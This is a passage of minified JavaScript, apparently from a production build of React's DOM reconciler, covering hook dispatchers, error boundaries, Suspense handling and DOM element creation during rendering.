SE(e,t,n){e.flags|=16384,e={getSnapshot:t,value:n},null===(t=it.updateQueue)?(t={lastEffect:null,stores:null},it.updateQueue=t,t.stores=[e]):null===(n=t.stores)?t.stores=[e]:n.push(e)}function _E(e,t,n,r){t.value=n,t.getSnapshot=r,TE(t)&&xE(e)}function EE(e,t,n){return n((function(){TE(t)&&xE(e)}))}function TE(e){var t=e.getSnapshot;e=e.value;try{var n=t();return!rr(e,n)}catch{return!0}}function xE(e){var t=Yr(e,1);null!==t&&nr(t,e,1,-1)}function k1(e){var t=ur();return"function"==typeof e&&(e=e()),t.memoizedState=t.baseState=e,e={pending:null,interleaved:null,lanes:0,dispatch:null,lastRenderedReducer:Gl,lastRenderedState:e},t.queue=e,e=e.dispatch=jR.bind(null,it,e),[t.memoizedState,e]}function Hl(e,t,n,r){return e={tag:e,create:t,destroy:n,deps:r,next:null},null===(t=it.updateQueue)?(t={lastEffect:null,stores:null},it.updateQueue=t,t.lastEffect=e.next=e):null===(n=t.lastEffect)?t.lastEffect=e.next=e:(r=n.next,n.next=e,e.next=r,t.lastEffect=e),e}function IE(){return Yn().memoizedState}function Kc(e,t,n,r){var i=ur();it.flags|=e,i.memoizedState=Hl(1|t,n,void 0,void 0===r?null:r)}function yd(e,t,n,r){var i=Yn();r=void 0===r?null:r;var s=void 0;if(null!==kt){var o=kt.memoizedState;if(s=o.destroy,null!==r&&ny(r,o.deps))return void(i.memoizedState=Hl(t,n,s,r))}it.flags|=e,i.memoizedState=Hl(1|t,n,s,r)}function D1(e,t){return Kc(8390656,8,e,t)}function sy(e,t){return yd(2048,8,e,t)}function kE(e,t){return yd(4,2,e,t)}function DE(e,t){return yd(4,4,e,t)}function CE(e,t){return"function"==typeof t?(e=e(),t(e),function(){t(null)}):null!=t?(e=e(),t.current=e,function(){t.current=null}):void 0}function NE(e,t,n){return n=null!=n?n.concat([e]):null,yd(4,4,CE.bind(null,t,e),n)}function oy(){}function ME(e,t){var n=Yn();t=void 0===t?null:t;var r=n.memoizedState;return null!==r&&null!==t&&ny(t,r[1])?r[0]:(n.memoizedState=[e,t],e)}function RE(e,t){var n=Yn();t=void 0===t?null:t;var r=n.memoizedState;return null!==r&&null!==t&&ny(t,r[1])?r[0]:(e=e(),n.memoizedState=[e,t],e)}function AE(e,t,n){return 21&Os?(rr(n,t)||(n=P_(),it.lanes|=n,Ps|=n,e.baseState=!0),t):(e.baseState&&(e.baseState=!1,vn=!0),e.memoizedState=n)}function zR(e,t){var n=be;be=0!==n&&4>n?n:4,e(!0);var r=np.transition;np.transition={};try{e(!1),t()}finally{be=n,np.transition=r}}function bE(){return Yn().memoizedState}function BR(e,t,n){var r=Di(e);if(n={lane:r,action:n,hasEagerState:!1,eagerState:null,next:null},OE(e))PE(t,n);else if(null!==(n=hE(e,t,n,r))){nr(n,e,r,hn()),$E(n,t,r)}}function jR(e,t,n){var r=Di(e),i={lane:r,action:n,hasEagerState:!1,eagerState:null,next:null};if(OE(e))PE(t,i);else{var s=e.alternate;if(0===e.lanes&&(null===s||0===s.lanes)&&null!==(s=t.lastRenderedReducer))try{var o=t.lastRenderedState,a=s(o,n);if(i.hasEagerState=!0,i.eagerState=a,rr(a,o)){var l=t.interleaved;return null===l?(i.next=i,Xg(t)):(i.next=l.next,l.next=i),void(t.interleaved=i)}}catch{}null!==(n=hE(e,t,i,r))&&(nr(n,e,r,i=hn()),$E(n,t,r))}}function OE(e){var t=e.alternate;return e===it||null!==t&&t===it}function PE(e,t){wl=kh=!0;var n=e.pending;null===n?t.next=t:(t.next=n.next,n.next=t),e.pending=t}function $E(e,t,n){if(4194240&n){var r=t.lanes;n|=r&=e.pendingLanes,t.lanes=n,Lg(e,n)}}var Dh={readContext:qn,useCallback:Jt,useContext:Jt,useEffect:Jt,useImperativeHandle:Jt,useInsertionEffect:Jt,useLayoutEffect:Jt,useMemo:Jt,useReducer:Jt,useRef:Jt,useState:Jt,useDebugValue:Jt,useDeferredValue:Jt,useTransition:Jt,useMutableSource:Jt,useSyncExternalStore:Jt,useId:Jt,unstable_isNewReconciler:!1},qR={readContext:qn,useCallback:function(e,t){return ur().memoizedState=[e,void 0===t?null:t],e},useContext:qn,useEffect:D1,useImperativeHandle:function(e,t,n){return n=null!=n?n.concat([e]):null,Kc(4194308,4,CE.bind(null,t,e),n)},useLayoutEffect:function(e,t){return Kc(4194308,4,e,t)},useInsertionEffect:function(e,t){return Kc(4,2,e,t)},useMemo:function(e,t){var n=ur();return t=void 0===t?null:t,e=e(),n.memoizedState=[e,t],e},useReducer:function(e,t,n){var r=ur();return t=void 0!==n?n(t):t,r.memoizedState=r.baseState=t,e={pending:null,interleaved:null,lanes:0,dispatch:null,lastRenderedReducer:e,lastRenderedState:t},r.queue=e,e=e.dispatch=BR.bind(null,it,e),[r.memoizedState,e]},useRef:function(e){return e={current:e},ur().memoizedState=e},useState:k1,useDebugValue:oy,useDeferredValue:function(e){return ur().memoizedState=e},useTransition:function(){var e=k1(!1),t=e[0];return e=zR.bind(null,e[1]),ur().memoizedState=e,[t,e]},useMutableSource:function(){},useSyncExternalStore:function(e,t,n){var r=it,i=ur();if(Xe){if(void 0===n)throw Error(U(407));n=n()}else{if(n=t(),null===Ot)throw Error(U(349));30&Os||SE(r,t,n)}i.memoizedState=n;var s={value:n,getSnapshot:t};return i.queue=s,D1(EE.bind(null,r,s,e),[e]),r.flags|=2048,Hl(9,_E.bind(null,r,s,n,t),void 0,null),n},useId:function(){var e=ur(),t=Ot.identifierPrefix;if(Xe){var n=$r;t=":"+t+"R"+(n=(Pr&~(1<<32-tr(Pr)-1)).toString(32)+n),0<(n=Wl++)&&(t+="H"+n.toString(32)),t+=":"}else t=":"+t+"r"+(n=UR++).toString(32)+":";return e.memoizedState=t},unstable_isNewReconciler:!1},YR={readContext:qn,useCallback:ME,useContext:qn,useEffect:sy,useImperativeHandle:NE,useInsertionEffect:kE,useLayoutEffect:DE,useMemo:RE,useReducer:rp,useRef:IE,useState:function(){return rp(Gl)},useDebugValue:oy,useDeferredValue:function(e){return AE(Yn(),kt.memoizedState,e)},useTransition:function(){return[rp(Gl)[0],Yn().memoizedState]},useMutableSource:vE,useSyncExternalStore:wE,useId:bE,unstable_isNewReconciler:!1},WR={readContext:qn,useCallback:ME,useContext:qn,useEffect:sy,useImperativeHandle:NE,useInsertionEffect:kE,useLayoutEffect:DE,useMemo:RE,useReducer:ip,useRef:IE,useState:function(){return ip(Gl)},useDebugValue:oy,useDeferredValue:function(e){var t=Yn();return null===kt?t.memoizedState=e:AE(t,kt.memoizedState,e)},useTransition:function(){return[ip(Gl)[0],Yn().memoizedState]},useMutableSource:vE,useSyncExternalStore:wE,useId:bE,unstable_isNewReconciler:!1};function Zo(e,t){try{var n="",r=t;do{n+=SM(r),r=r.return}while(r);var i=n}catch(e){i="\nError generating stack: "+e.message+"\n"+e.stack}return{value:e,source:t,stack:i,digest:null}}function sp(e,t,n){return{value:e,source:null,stack:n??null,digest:t??null}}function mm(e,t){try{console.error(t.value)}catch(e){setTimeout((function(){throw e}))}}var GR="function"==typeof WeakMap?WeakMap:Map;function LE(e,t,n){(n=Ur(-1,n)).tag=3,n.payload={element:null};var r=t.value;return n.callback=function(){Nh||(Nh=!0,Im=r),mm(e,t)},n}function FE(e,t,n){(n=Ur(-1,n)).tag=3;var r=e.type.getDerivedStateFromError;if("function"==typeof r){var i=t.value;n.payload=function(){return r(i)},n.callback=function(){mm(e,t)}}var s=e.stateNode;return null!==s&&"function"==typeof s.componentDidCatch&&(n.callback=function(){mm(e,t),"function"!=typeof r&&(null===ki?ki=new Set([this]):ki.add(this));var n=t.stack;this.componentDidCatch(t.value,{componentStack:null!==n?n:""})}),n}function C1(e,t,n){var r=e.pingCache;if(null===r){r=e.pingCache=new GR;var i=new Set;r.set(t,i)}else void 0===(i=r.get(t))&&(i=new Set,r.set(t,i));i.has(n)||(i.add(n),e=aA.bind(null,e,t,n),t.then(e,e))}function N1(e){do{var t;if((t=13===e.tag)&&(t=null===(t=e.memoizedState)||null!==t.dehydrated),t)return e;e=e.return}while(null!==e);return null}function M1(e,t,n,r,i){return 1&e.mode?(e.flags|=65536,e.lanes=i,e):(e===t?e.flags|=65536:(e.flags|=128,n.flags|=131072,n.flags&=-52805,1===n.tag&&(null===n.alternate?n.tag=17:((t=Ur(-1,1)).tag=2,Ii(n,t,1))),n.lanes|=1),e)}var HR=Qr.ReactCurrentOwner,vn=!1;function an(e,t,n,r){t.child=null===e?gE(t,null,n,r):Xo(t,e.child,n,r)}function R1(e,t,n,r,i){n=n.render;var s=t.ref;return zo(t,i),r=ry(e,t,n,r,s,i),n=iy(),null===e||vn?(Xe&&n&&Yg(t),t.flags|=1,an(e,t,r,i),t.child):(t.updateQueue=e.updateQueue,t.flags&=-2053,e.lanes&=~i,Wr(e,t,i))}function A1(e,t,n,r,i){if(null===e){var s=n.type;return"function"!=typeof s||py(s)||void 0!==s.defaultProps||null!==n.compare||void 0!==n.defaultProps?((e=Zc(n.type,null,r,t,t.mode,i)).ref=t.ref,e.return=t,t.child=e):(t.tag=15,t.type=s,VE(e,t,s,r,i))}if(s=e.child,!(e.lanes&i)){var o=s.memoizedProps;if((n=null!==(n=n.compare)?n:Ul)(o,r)&&e.ref===t.ref)return Wr(e,t,i)}return t.flags|=1,(e=Ci(s,r)).ref=t.ref,e.return=t,t.child=e}function VE(e,t,n,r,i){if(null!==e){var s=e.memoizedProps;if(Ul(s,r)&&e.ref===t.ref){if(vn=!1,t.pendingProps=r=s,0==(e.lanes&i))return t.lanes=e.lanes,Wr(e,t,i);131072&e.flags&&(vn=!0)}}return gm(e,t,n,r,i)}function UE(e,t,n){var r=t.pendingProps,i=r.children,s=null!==e?e.memoizedState:null;if("hidden"===r.mode)if(1&t.mode){if(!(1073741824&n))return e=null!==s?s.baseLanes|n:n,t.lanes=t.childLanes=1073741824,t.memoizedState={baseLanes:e,cachePool:null,transitions:null},t.updateQueue=null,ze(bo,Dn),Dn|=e,null;t.memoizedState={baseLanes:0,cachePool:null,transitions:null},r=null!==s?s.baseLanes:n,ze(bo,Dn),Dn|=r}else t.memoizedState={baseLanes:0,cachePool:null,transitions:null},ze(bo,Dn),Dn|=n;else null!==s?(r=s.baseLanes|n,t.memoizedState=null):r=n,ze(bo,Dn),Dn|=r;return an(e,t,i,n),t.child}function zE(e,t){var n=t.ref;(null===e&&null!==n||null!==e&&e.ref!==n)&&(t.flags|=512,t.flags|=2097152)}function gm(e,t,n,r,i){var s=xn(n)?As:sn.current;return s=Ko(t,s),zo(t,i),n=ry(e,t,n,r,s,i),r=iy(),null===e||vn?(Xe&&r&&Yg(t),t.flags|=1,an(e,t,n,i),t.child):(t.updateQueue=e.updateQueue,t.flags&=-2053,e.lanes&=~i,Wr(e,t,i))}function b1(e,t,n,r,i){if(xn(n)){var s=!0;wh(t)}else s=!1;if(zo(t,i),null===t.stateNode)Qc(e,t),pE(t,n,r),pm(t,n,r,i),r=!0;else if(null===e){var o=t.stateNode,a=t.memoizedProps;o.props=a;var l=o.context,u=n.contextType;"object"==typeof u&&null!==u?u=qn(u):u=Ko(t,u=xn(n)?As:sn.current);var c=n.getDerivedStateFromProps,h="function"==typeof c||"function"==typeof o.getSnapshotBeforeUpdate;h||"function"!=typeof o.UNSAFE_componentWillReceiveProps&&"function"!=typeof o.componentWillReceiveProps||(a!==r||l!==u)&&x1(t,o,r,u),hi=!1;var d=t.memoizedState;o.state=d,xh(t,r,o,i),l=t.memoizedState,a!==r||d!==l||Tn.current||hi?("function"==typeof c&&(fm(t,n,c,r),l=t.memoizedState),(a=hi||T1(t,n,a,r,d,l,u))?(h||"function"!=typeof o.UNSAFE_componentWillMount&&"function"!=typeof o.componentWillMount||("function"==typeof o.componentWillMount&&o.componentWillMount(),"function"==typeof o.UNSAFE_componentWillMount&&o.UNSAFE_componentWillMount()),"function"==typeof o.componentDidMount&&(t.flags|=4194308)):("function"==typeof o.componentDidMount&&(t.flags|=4194308),t.memoizedProps=r,t.memoizedState=l),o.props=r,o.state=l,o.context=u,r=a):("function"==typeof o.componentDidMount&&(t.flags|=4194308),r=!1)}else{o=t.stateNode,dE(e,t),a=t.memoizedProps,u=t.type===t.elementType?a:Xn(t.type,a),o.props=u,h=t.pendingProps,d=o.context,"object"==typeof(l=n.contextType)&&null!==l?l=qn(l):l=Ko(t,l=xn(n)?As:sn.current);var f=n.getDerivedStateFromProps;(c="function"==typeof f||"function"==typeof o.getSnapshotBeforeUpdate)||"function"!=typeof o.UNSAFE_componentWillReceiveProps&&"function"!=typeof o.componentWillReceiveProps||(a!==h||d!==l)&&x1(t,o,r,l),hi=!1,d=t.memoizedState,o.state=d,xh(t,r,o,i);var p=t.memoizedState;a!==h||d!==p||Tn.current||hi?("function"==typeof f&&(fm(t,n,f,r),p=t.memoizedState),(u=hi||T1(t,n,u,r,d,p,l)||!1)?(c||"function"!=typeof o.UNSAFE_componentWillUpdate&&"function"!=typeof o.componentWillUpdate||("function"==typeof o.componentWillUpdate&&o.componentWillUpdate(r,p,l),"function"==typeof o.UNSAFE_componentWillUpdate&&o.UNSAFE_componentWillUpdate(r,p,l)),"function"==typeof o.componentDidUpdate&&(t.flags|=4),"function"==typeof o.getSnapshotBeforeUpdate&&(t.flags|=1024)):("function"!=typeof o.componentDidUpdate||a===e.memoizedProps&&d===e.memoizedState||(t.flags|=4),"function"!=typeof o.getSnapshotBeforeUpdate||a===e.memoizedProps&&d===e.memoizedState||(t.flags|=1024),t.memoizedProps=r,t.memoizedState=p),o.props=r,o.state=p,o.context=l,r=u):("function"!=typeof o.componentDidUpdate||a===e.memoizedProps&&d===e.memoizedState||(t.flags|=4),"function"!=typeof o.getSnapshotBeforeUpdate||a===e.memoizedProps&&d===e.memoizedState||(t.flags|=1024),r=!1)}return ym(e,t,n,r,s,i)}function ym(e,t,n,r,i,s){zE(e,t);var o=0!=(128&t.flags);if(!r&&!o)return i&&v1(t,n,!1),Wr(e,t,s);r=t.stateNode,HR.current=t;var a=o&&"function"!=typeof n.getDerivedStateFromError?null:r.render();return t.flags|=1,null!==e&&o?(t.child=Xo(t,e.child,null,s),t.child=Xo(t,null,a,s)):an(e,t,a,s),t.memoizedState=r.state,i&&v1(t,n,!0),t.child}function BE(e){var t=e.stateNode;t.pendingContext?y1(e,t.pendingContext,t.pendingContext!==t.context):t.context&&y1(e,t.context,!1),Zg(e,t.containerInfo)}function O1(e,t,n,r,i){return Qo(),Gg(i),t.flags|=256,an(e,t,n,r),t.child}var YE,Sm,WE,GE,vm={dehydrated:null,treeContext:null,retryLane:0};function wm(e){return{baseLanes:e,cachePool:null,transitions:null}}function jE(e,t,n){var r,i=t.pendingProps,s=rt.current,o=!1,a=0!=(128&t.flags);if((r=a)||(r=(null===e||null!==e.memoizedState)&&0!=(2&s)),r?(o=!0,t.flags&=-129):(null===e||null!==e.memoizedState)&&(s|=1),ze(rt,1&s),null===e)return hm(t),null!==(e=t.memoizedState)&&null!==(e=e.dehydrated)?(1&t.mode?"$!"===e.data?t.lanes=8:t.lanes=1073741824:t.lanes=1,null):(a=i.children,e=i.fallback,o?(i=t.mode,o=t.child,a={mode:"hidden",children:a},1&i||null===o?o=Sd(a,i,0,null):(o.childLanes=0,o.pendingProps=a),e=Ns(e,i,n,null),o.return=t,e.return=t,o.sibling=e,t.child=o,t.child.memoizedState=wm(n),t.memoizedState=vm,e):ay(t,a));if(null!==(s=e.memoizedState)&&null!==(r=s.dehydrated))return KR(e,t,a,i,r,s,n);if(o){o=i.fallback,a=t.mode,r=(s=e.child).sibling;var l={mode:"hidden",children:i.children};return 1&a||t.child===s?(i=Ci(s,l)).subtreeFlags=14680064&s.subtreeFlags:((i=t.child).childLanes=0,i.pendingProps=l,t.deletions=null),null!==r?o=Ci(r,o):(o=Ns(o,a,n,null)).flags|=2,o.return=t,i.return=t,i.sibling=o,t.child=i,i=o,o=t.child,a=null===(a=e.child.memoizedState)?wm(n):{baseLanes:a.baseLanes|n,cachePool:null,transitions:a.transitions},o.memoizedState=a,o.childLanes=e.childLanes&~n,t.memoizedState=vm,i}return e=(o=e.child).sibling,i=Ci(o,{mode:"visible",children:i.children}),!(1&t.mode)&&(i.lanes=n),i.return=t,i.sibling=null,null!==e&&(null===(n=t.deletions)?(t.deletions=[e],t.flags|=16):n.push(e)),t.child=i,t.memoizedState=null,i}function ay(e,t){return(t=Sd({mode:"visible",children:t},e.mode,0,null)).return=e,e.child=t}function Ec(e,t,n,r){return null!==r&&Gg(r),Xo(t,e.child,null,n),(e=ay(t,t.pendingProps.children)).flags|=2,t.memoizedState=null,e}function KR(e,t,n,r,i,s,o){if(n)return 256&t.flags?(t.flags&=-257,Ec(e,t,o,r=sp(Error(U(422))))):null!==t.memoizedState?(t.child=e.child,t.flags|=128,null):(s=r.fallback,i=t.mode,r=Sd({mode:"visible",children:r.children},i,0,null),(s=Ns(s,i,o,null)).flags|=2,r.return=t,s.return=t,r.sibling=s,t.child=r,1&t.mode&&Xo(t,e.child,null,o),t.child.memoizedState=wm(o),t.memoizedState=vm,s);if(!(1&t.mode))return Ec(e,t,o,null);if("$!"===i.data){if(r=i.nextSibling&&i.nextSibling.dataset)var a=r.dgst;return r=a,Ec(e,t,o,r=sp(s=Error(U(419)),r,void 0))}if(a=0!=(o&e.childLanes),vn||a){if(null!==(r=Ot)){switch(o&-o){case 4:i=2;break;case 16:i=8;break;case 64:case 128:case 256:case 512:case 1024:case 2048:case 4096:case 8192:case 16384:case 32768:case 65536:case 131072:case 262144:case 524288:case 1048576:case 2097152:case 4194304:case 8388608:case 16777216:case 33554432:case 67108864:i=32;break;case 536870912:i=268435456;break;default:i=0}0!==(i=i&(r.suspendedLanes|o)?0:i)&&i!==s.retryLane&&(s.retryLane=i,Yr(e,i),nr(r,e,i,-1))}return fy(),Ec(e,t,o,r=sp(Error(U(421))))}return"$?"===i.data?(t.flags|=128,t.child=e.child,t=lA.bind(null,e),i._reactRetry=t,null):(e=s.treeContext,Cn=xi(i.nextSibling),Nn=t,Xe=!0,Zn=null,null!==e&&(Fn[Vn++]=Pr,Fn[Vn++]=$r,Fn[Vn++]=bs,Pr=e.id,$r=e.overflow,bs=t),(t=ay(t,r.children)).flags|=4096,t)}function P1(e,t,n){e.lanes|=t;var r=e.alternate;null!==r&&(r.lanes|=t),dm(e.return,t,n)}function op(e,t,n,r,i){var s=e.memoizedState;null===s?e.memoizedState={isBackwards:t,rendering:null,renderingStartTime:0,last:r,tail:n,tailMode:i}:(s.isBackwards=t,s.rendering=null,s.renderingStartTime=0,s.last=r,s.tail=n,s.tailMode=i)}function qE(e,t,n){var r=t.pendingProps,i=r.revealOrder,s=r.tail;if(an(e,t,r.children,n),2&(r=rt.current))r=1&r|2,t.flags|=128;else{if(null!==e&&128&e.flags)e:for(e=t.child;null!==e;){if(13===e.tag)null!==e.memoizedState&&P1(e,n,t);else if(19===e.tag)P1(e,n,t);else if(null!==e.child){e.child.return=e,e=e.child;continue}if(e===t)break e;for(;null===e.sibling;){if(null===e.return||e.return===t)break e;e=e.return}e.sibling.return=e.return,e=e.sibling}r&=1}if(ze(rt,r),1&t.mode)switch(i){case"forwards":for(n=t.child,i=null;null!==n;)null!==(e=n.alternate)&&null===Ih(e)&&(i=n),n=n.sibling;null===(n=i)?(i=t.child,t.child=null):(i=n.sibling,n.sibling=null),op(t,!1,i,n,s);break;case"backwards":for(n=null,i=t.child,t.child=null;null!==i;){if(null!==(e=i.alternate)&&null===Ih(e)){t.child=i;break}e=i.sibling,i.sibling=n,n=i,i=e}op(t,!0,n,null,s);break;case"together":op(t,!1,null,null,void 0);break;default:t.memoizedState=null}else t.memoizedState=null;return t.child}function Qc(e,t){!(1&t.mode)&&null!==e&&(e.alternate=null,t.alternate=null,t.flags|=2)}function Wr(e,t,n){if(null!==e&&(t.dependencies=e.dependencies),Ps|=t.lanes,!(n&t.childLanes))return null;if(null!==e&&t.child!==e.child)throw Error(U(153));if(null!==t.child){for(n=Ci(e=t.child,e.pendingProps),t.child=n,n.return=t;null!==e.sibling;)e=e.sibling,(n=n.sibling=Ci(e,e.pendingProps)).return=t;n.sibling=null}return t.child}function QR(e,t,n){switch(t.tag){case 3:BE(t),Qo();break;case 5:yE(t);break;case 1:xn(t.type)&&wh(t);break;case 4:Zg(t,t.stateNode.containerInfo);break;case 10:var r=t.type._context,i=t.memoizedProps.value;ze(Eh,r._currentValue),r._currentValue=i;break;case 13:if(null!==(r=t.memoizedState))return null!==r.dehydrated?(ze(rt,1&rt.current),t.flags|=128,null):n&t.child.childLanes?jE(e,t,n):(ze(rt,1&rt.current),null!==(e=Wr(e,t,n))?e.sibling:null);ze(rt,1&rt.current);break;case 19:if(r=0!=(n&t.childLanes),128&e.flags){if(r)return qE(e,t,n);t.flags|=128}if(null!==(i=t.memoizedState)&&(i.rendering=null,i.tail=null,i.lastEffect=null),ze(rt,rt.current),r)break;return null;case 22:case 23:return t.lanes=0,UE(e,t,n)}return Wr(e,t,n)}function Ya(e,t){if(!Xe)switch(e.tailMode){case"hidden":t=e.tail;for(var n=null;null!==t;)null!==t.alternate&&(n=t),t=t.sibling;null===n?e.tail=null:n.sibling=null;break;case"collapsed":n=e.tail;for(var r=null;null!==n;)null!==n.alternate&&(r=n),n=n.sibling;null===r?t||null===e.tail?e.tail=null:e.tail.sibling=null:r.sibling=null}}function Zt(e){var t=null!==e.alternate&&e.alternate.child===e.child,n=0,r=0;if(t)for(var i=e.child;null!==i;)n|=i.lanes|i.childLanes,r|=14680064&i.subtreeFlags,r|=14680064&i.flags,i.return=e,i=i.sibling;else for(i=e.child;null!==i;)n|=i.lanes|i.childLanes,r|=i.subtreeFlags,r|=i.flags,i.return=e,i=i.sibling;return e.subtreeFlags|=r,e.childLanes=n,t}function XR(e,t,n){var r=t.pendingProps;switch(Wg(t),t.tag){case 2:case 16:case 15:case 0:case 11:case 7:case 8:case 12:case 9:case 14:return Zt(t),null;case 1:return xn(t.type)&&vh(),Zt(t),null;case 3:return r=t.stateNode,Jo(),Ge(Tn),Ge(sn),ty(),r.pendingContext&&(r.context=r.pendingContext,r.pendingContext=null),(null===e||null===e.child)&&(Sc(t)?t.flags|=4:null===e||e.memoizedState.isDehydrated&&!(256&t.flags)||(t.flags|=1024,null!==Zn&&(Cm(Zn),Zn=null))),Sm(e,t),Zt(t),null;case 5:ey(t);var i=Es(Yl.current);if(n=t.type,null!==e&&null!=t.stateNode)WE(e,t,n,r,i),e.ref!==t.ref&&(t.flags|=512,t.flags|=2097152);else{if(!r){if(null===t.stateNode)throw Error(U(166));return Zt(t),null}if(e=Es(yr.current),Sc(t)){r=t.stateNode,n=t.type;var s=t.memoizedProps;switch(r[hr]=t,r[jl]=s,e=0!=(1&t.mode),n){case"dialog":Ye("cancel",r),Ye("close",r);break;case"iframe":case"object":case"embed":Ye("load",r);break;case"video":case"audio":for(i=0;i<ol.length;i++)Ye(ol[i],r);break;case"source":Ye("error",r);break;case"img":case"image":case"link":Ye("error",r),Ye("load",r);break;case"details":Ye("toggle",r);break;case"input":q0(r,s),Ye("invalid",r);break;case"select":r._wrapperState={wasMultiple:!!s.multiple},Ye("invalid",r);break;case"textarea":W0(r,s),Ye("invalid",r)}for(var o in Gp(n,s),i=null,s)if(s.hasOwnProperty(o)){var a=s[o];"children"===o?"string"==typeof a?r.textContent!==a&&(!0!==s.suppressHydrationWarning&&wc(r.textContent,a,e),i=["children",a]):"number"==typeof a&&r.textContent!==""+a&&(!0!==s.suppressHydrationWarning&&wc(r.textContent,a,e),i=["children",""+a]):bl.hasOwnProperty(o)&&null!=a&&"onScroll"===o&&Ye("scroll",r)}switch(n){case"input":hc(r),Y0(r,s,!0);break;case"textarea":hc(r),G0(r);break;case"select":case"option":break;default:"function"==typeof s.onClick&&(r.onclick=yh)}r=i,t.updateQueue=r,null!==r&&(t.flags|=4)}else{o=9===i.nodeType?i:i.ownerDocument,"http://www.w3.org/1999/xhtml"===e&&(e=S_(n)),"http://www.w3.org/1999/xhtml"===e?"script"===n?((e=o.createElement("div")).innerHTML="<script><\/script>",e=e.removeChild(e.firstChild)):"string"==typeof r.is?e=o.createElement(n,{is:r.is}):(e=o.createElement(n),"select"===n&&(o=e,r.multiple?o.multiple=!0:r.size&&(o.size=r.size))):e=o.createElementNS(e,n),e[hr]=t,e[jl]=r,YE(e,t,!1,!1),t.stateNode=e;e:{switch(o=Hp(n,r),n){case"dialog":Ye("cancel",e),Ye("close",e),i=r;break;case"iframe":case"object":case"embed":Ye("load",e),i=r;break;case"video":case"audio":for(i=0;i<ol.length;i++)Ye(ol[i],e);i=r;break;case"source":Ye("error",e),i=r;break;case"img":case"image":case"link":Ye("error",e),Ye("load",e),i=r;break;case"details":Ye("toggle",e),i=r;break;case"input":q0(e,r),i=Bp(e,r),Ye("invalid",e);break;case"option":i=r;break;case"select":e._wrapperState={wasMultiple:!!r.multiple},i=st({},r,{value:void 0}),Ye("invalid",e);break;case"textarea":W0(e,r),i=Yp(e,r),Ye("invalid",e);break;default:i=r}for(s in Gp(n,i),a=i)if(a.hasOwnProperty(s)){var l=a[s];"style"===s?T_(e,l):"dangerouslySetInnerHTML"===s?null!=(l=l?l.__html:void 0)&&__(e,l):"children"===s?"string"==typeof l?("textarea"!==n||""!==l)&&Ol(e,l):"number"==typeof l&&Ol(e,""+l):"suppressContentEditableWarning"!==s&&"suppressHydrationWarning"!==s&&"autoFocus"!==s&&(bl.hasOwnProperty(s)?null!=l&&"onScroll"===s&&Ye("scroll",e):null!=l&&Rg(e,s,l,o))}switch(n){case"input":hc(e),Y0(e,r,!1);break;case"textarea":hc(e),G0(e);break;case"option":null!=r.value&&e.setAttribute("value",""+Ai(r.value));break;case"select":e.multiple=!!r.multiple,null!=(s=r.value)?Lo(e,!!r.multiple,s,!1):null!=r.defaultValue&&Lo(e,!!r.multiple,r.defaultValue,!0);break;default:"function"==typeof i.onClick&&(e.onclick=yh)}switch(n){case"button":case"input":case"select":case"textarea":r=!!r.autoFocus;break e;case"img":r=!0;break e;default:r=!1}}r&&(t.flags|=4)}null!==t.ref&&(t.flags|=512,t.flags|=2097152)}return Zt(t),null;case 6:if(e&&null!=t.stateNode)GE(e,t,e.memoizedProps,r);else{if("string"!=typeof r&&null===t.stateNode)throw Error(U(166));if(n=Es(Yl.current),Es(yr.current),Sc(t)){if(r=t.stateNode,n=t.memoizedProps,r[hr]=t,(s=r.nodeValue!==n)&&null!==(e=Nn))switch(e.tag){case 3:wc(r.nodeValue,n,0!=(1&e.mode));break;case 5:!0!==e.memoizedProps.suppressHydrationWarning&&wc(r.nodeValue,n,0!=(1&e.mode))}s&&(t.flags|=4)}else(r=(9===n.nodeType?n:n.ownerDocument).createTextNode(r))[hr]=t,t.stateNode=r}return Zt(t),null;case 13:if(Ge(rt),r=t.memoizedState,null===e||null!==e.memoizedState&&null!==e.memoizedState.dehydrated){if(Xe&&null!==Cn&&1&t.mode&&!(128&t.flags))cE(),Qo(),t.flags|=98560,s=!1;else if(s=Sc(t),null!==r&&null!==r.dehydrated){if(null===e){if(!s)throw Error(U(318));if(!(s=null!==(s=t.memoizedState)?s.dehydrated:null))throw Error(U(317));s[hr]=t}else Qo(),!(128&t.flags)&&(t.memoizedState=null),t.flags|=4;Zt(t),s=!1}else null!==Zn&&(Cm(Zn),Zn=null),s=!0;if(!s)return 65536&t.flags?t:null}return 128&t.flags?(t.lanes=n,t):((r=null!==r)!==(null!==e&&null!==e.memoizedState)&&r&&(t.child.flags|=8192,1&t.mode&&(null===e||1&rt.current?0===Dt&&(Dt=3):fy())),null!==t.updateQueue&&(t.flags|=4),Zt(t),null);case 4:return Jo(),Sm(e,t),null===e&&zl(t.stateNode.containerInfo),Zt(t),null;case 10:return Qg(t.type._context),Zt(t),null;case 17:return xn(t.type)&&vh(),Zt(t),null;case 19:if(Ge(rt),null===(s=t.memoizedState))return Zt(t),null;if(r=0!=(128&t.flags),null===(o=s.rendering))if(r)Ya(s,!1);else{if(0!==Dt||null!==e&&128&e.flags)for(e=t.child;null!==e;){if(null!==(o=Ih(e))){for(t.flags|=128,Ya(s,!1),null!==(r=o.updateQueue)&&(t.updateQueue=r,t.flags|=4),t.subtreeFlags=0,r=n,n=t.child;null!==n;)e=r,(s=n).flags&=14680066,null===(o=s.alternate)?(s.childLanes=0,s.lanes=e,s.child=null,s.subtreeFlags=0,s.memoizedProps=null,s.memoizedState=null,s.updateQueue=null,s.dependencies=null,s.stateNode=null):(s.childLanes=o.childLanes,s.lanes=o.lanes,s.child=o.child,s.subtreeFlags=0,s.deletions=null,s.memoizedProps=o.memoizedProps,s.memoizedState=o.memoizedState,s.updateQueue=o.updateQueue,s.type=o.type,e=o.dependencies,s.dependencies=null===e?null:{lanes:e.lanes,firstContext:e.firstContext}),n=n.sibling;return ze(rt,1&rt.current|2),t.child}e=e.sibling}null!==s.tail&&pt()>ea&&(t.flags|=128,r=!0,Ya(s,!1),t.lanes=4194304)}else{if(!r)if(null!==(e=Ih(o))){if(t.flags|=128,r=!0,null!==(n=e.updateQueue)&&(t.updateQueue=n,t.flags|=4),Ya(s,!0),null===s.tail&&"hidden"===s.tailMode&&!o.alternate&&!Xe)return Zt(t),null}else 2*pt()-s.renderingStartTime>ea&&1073741824!==n&&(t.flags|=128,r=!0,Ya(s,!1),t.lanes=4194304);s.isBackwards?(o.sibling=t.child,t.child=o):(null!==(n=s.last)?n.sibling=o:t.child=o,s.last=o)}return null!==s.tail?(t=s.tail,s.rendering=t,s.tail=t.sibling,s.renderingStartTime=pt(),t.sibling=null,n=rt.current,ze(rt,r?1&n|2:1&n),t):(Zt(t),null);case 22:case 23:return 